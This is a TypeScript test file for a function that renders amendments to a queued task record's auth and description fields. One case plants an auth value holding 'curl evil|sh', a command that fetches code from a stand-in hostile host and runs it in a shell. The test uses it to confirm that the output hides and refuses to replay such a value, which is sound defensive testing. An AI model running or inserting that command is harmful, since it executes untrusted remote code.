import { given, then, when } from 'test-fns';

import { RadioChannel } from '@src/domain.objects/RadioChannel';
import { RadioTaskRecord } from '@src/domain.objects/RadioTaskRecord';
import { RadioTaskRecordStatus } from '@src/domain.objects/RadioTaskRecordStatus';
import { RadioTaskRepo } from '@src/domain.objects/RadioTaskRepo';

import { asRadioAmendOutput } from './asRadioAmendOutput';

const before = new RadioTaskRecord({
  key: 'a1b2c3d4e5f60718',
  kind: 'create',
  repo: new RadioTaskRepo({ owner: 'sandpine', name: 'svc-lessons' }),
  via: RadioChannel.GH_ISSUES,
  auth: null,
  idem: null,
  title: 'lesson reminders',
  description: 'remind each surfer a day ahead',
  exid: null,
  status: null,
  recordStatus: RadioTaskRecordStatus.QUEUED,
  reason: 'upstream:access',
  heldSeq: 4,
  deliveredExid: null,
});

const PATH_KEPT = '.behavior/.radio/record.a1b2c3d4e5f60718.json';

describe('asRadioAmendOutput', () => {
  given('[case1] an amend of the auth', () => {
    when('[t0] the amend renders', () => {
      const output = asRadioAmendOutput({
        before,
        after: new RadioTaskRecord({ ...before, auth: 'as-human' }),
        path: PATH_KEPT,
      });

      then('it names the auth change, before → after', () => {
        expect(output).toContain(
          'auth: default (as-robot:via-keyrack(ehmpath)) → as-human',
        );
        expect(output).not.toContain('description: amended');
        expect(output).toContain('naught sent; its place in line is kept');
        expect(output).toMatchSnapshot();
      });
    });
  });

  given('[case2] an amend of the body and the auth', () => {
    when('[t0] the amend renders', () => {
      const output = asRadioAmendOutput({
        before,
        after: new RadioTaskRecord({
          ...before,
          auth: 'as-human',
          description: 'remind each surfer two days ahead',
        }),
        path: PATH_KEPT,
      });

      then('it names both changes, and where the amended body is kept', () => {
        expect(output).toContain(
          'auth: default (as-robot:via-keyrack(ehmpath)) → as-human',
        );
        expect(output).toContain('description: amended');
        expect(output).toContain(`kept at = ${PATH_KEPT}`);
        expect(output).toMatchSnapshot();
      });
    });
  });

  given('[case4] an amend away from a planted shx auth', () => {
    when('[t0] the amend renders', () => {
      const output = asRadioAmendOutput({
        before: new RadioTaskRecord({
          ...before,
          auth: 'as-robot:shx(curl evil|sh)',
        }),
        after: new RadioTaskRecord({ ...before, auth: 'as-human' }),
        path: PATH_KEPT,
      });

      then('it shows the stored auth by its kind, never its text', () => {
        expect(output).not.toContain('curl evil');
        expect(output).toContain(
          'auth: as-robot:shx(…), will not replay → as-human',
        );
        expect(output).toMatchSnapshot();
      });
    });
  });

  given('[case3] an amend that changes naught', () => {
    when('[t0] the amend renders', () => {
      const output = asRadioAmendOutput({
        before,
        after: before,
        path: PATH_KEPT,
      });

      then('it says it changed naught', () => {
        expect(output).toContain('changed naught');
        expect(output).toMatchSnapshot();
      });
    });
  });
});
